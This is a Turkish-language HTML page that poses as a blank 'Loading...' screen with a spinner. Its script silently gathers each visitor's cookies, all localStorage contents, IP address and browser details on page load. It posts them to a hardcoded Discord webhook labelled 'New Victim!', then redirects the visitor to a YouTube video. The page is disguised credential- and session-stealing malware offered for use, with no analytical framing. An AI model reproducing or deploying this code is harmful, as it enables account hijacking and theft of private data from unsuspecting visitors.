<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yükleniyor...</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        .loader {
            border: 4px solid #333;
            border-top: 4px solid white;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader"></div>

<script>
    // --- AYARLAR ---
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke"; 

    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return "Bilinmiyor";
        }
    }

    async function collectAndSendData() {
        // Tüm localStorage verilerini al
        let allLocalData = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            allLocalData[key] = value;
        }

        const cookies = document.cookie;
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenResolution = window.screen.width + "x" + window.screen.height;
        const ip = await getIP();

        // Veriyi hazırla
        let data = {
            allLocalStorage: allLocalData, // TÜM localStorage
            cookies: cookies,
            userAgent: userAgent,
            platform: platform,
            language: language,
            screenResolution: screenResolution,
            ip: ip
        };

        // JSON formatında veriyi Discord'a gönder
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: "🔥 Yeni Kurban! 🔥\n" + JSON.stringify(data, null, 2) 
                })
            });
            console.log("Veriler başarıyla gönderildi.");
        } catch (error) {
            console.error("Gönderme hatası:", error);
        }
    }

    window.onload = function() {
        collectAndSendData();

        setTimeout(() => {
            window.location.href = "https://www.youtube.com/watch?v=cwQgjq0mCdE&list=RDcwQgjq0mCdE&start_radio=1&pp=ygUPa2FueWUgaSBsb3ZlIGl0oAcB";
        }, 2000);
    };
</script>

</body>
</html>
